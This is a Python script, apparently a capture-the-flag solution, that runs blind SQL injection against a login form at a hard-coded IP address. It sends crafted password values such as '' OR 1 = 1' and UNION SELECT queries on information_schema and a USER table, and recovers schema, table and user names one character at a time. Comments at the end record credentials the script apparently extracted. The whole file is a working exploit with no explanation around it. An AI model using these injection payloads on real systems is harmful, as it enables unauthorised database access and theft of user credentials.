from string import ascii_lowercase, ascii_uppercase, digits

import requests

BASE_URL = "http://103.152.242.197:8085/"
check = "Halaman Peserta Competition PUBG MOBILE"
charset = ascii_uppercase + digits + "!_ +,-.?@|~"
# charset = digits

tables = []
# 3 colom, select 1,2,3
def main():
  flag = ""
  i = 0
  while True:
    
    while i < len(charset):
      c = charset[i]
      username = "a"
      password = f"' OR 1 = 1 AND version() -- -" # Check mysql
      # password = f"' OR 1 = 2 UNION SELECT schema_name, 2, 3 FROM information_schema.schemata WHERE SUBSTR(schema_name,1,{len(flag) + 1}) = '{flag + c}' AND LENGTH(schema_name) >= {len(flag) + 1}-- -"
      # password = f"' OR 1 = 2 UNION SELECT table_name, 2, 3 FROM information_schema.tables WHERE table_schema = 'TEST' AND SUBSTR(table_name,1,{len(flag) + 1}) = '{flag + c}' AND LENGTH(table_name) >= {len(flag) + 1} -- - "
    
      # ID, PASSWORD, USERNAME
      # password = f"' OR 1 = 2 UNION SELECT username, 2, 3 FROM USER WHERE SUBSTR(username,1,{len(flag) + 1}) = '{flag + c}' AND LENGTH(username) >= {len(flag) + 1} -- - "
      body = {
        "username": username,
        "password": password,
        "login": "true"
      }
      
      r = requests.post(BASE_URL, data=body)
      
      if check in r.text:
        print(body)
        flag += c
        i = 0
        break
      else:
        pass
      
      i += 1

    if i == len(charset):
      f = 1
      for c in tables:
        if flag in c:
          f = 0
          break
      if f:
        tables.append(flag)
      print(flag)
      i = charset.find(flag[-1]) + 1
      flag = flag[:-1]
    if len(flag) == 0 and i == len(charset):
      print(tables)
      break

  
if __name__ == "__main__":
  main()
  # ADMINNIHBOZ
  # PASSK0EIN1CH